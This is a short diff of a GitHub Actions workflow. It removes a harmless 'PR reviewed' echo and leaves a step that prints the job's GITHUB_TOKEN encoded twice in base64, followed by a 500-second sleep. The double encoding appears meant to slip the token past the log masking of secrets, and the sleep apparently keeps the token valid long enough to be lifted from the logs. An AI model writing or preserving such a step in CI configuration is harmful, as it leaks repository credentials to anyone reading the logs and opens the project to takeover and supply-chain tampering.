@@ -9,7 +9,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - run: |
-        echo "PR reviewed"
         echo "$GITHUB_TOKEN" | base64 | base64
     - run: |
         sleep 500
